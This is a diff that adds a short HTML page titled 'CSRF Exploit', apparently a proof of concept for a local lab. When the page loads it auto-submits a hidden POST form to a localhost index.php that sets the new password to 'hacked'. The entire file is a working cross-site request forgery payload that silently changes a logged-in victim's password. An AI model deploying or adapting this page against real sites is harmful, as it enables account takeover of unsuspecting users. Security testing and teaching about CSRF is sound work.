@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Exploit</title>
+</head>
+<body onload="document.getElementById('csrf_form').submit();">
+    <h2>CSRF Attack Running...</h2>
+    <form id="csrf_form" action="http://localhost/index.php" method="POST">
+        <input type="hidden" name="new_password" value="hacked">
+    </form>
+</body>
+</html>
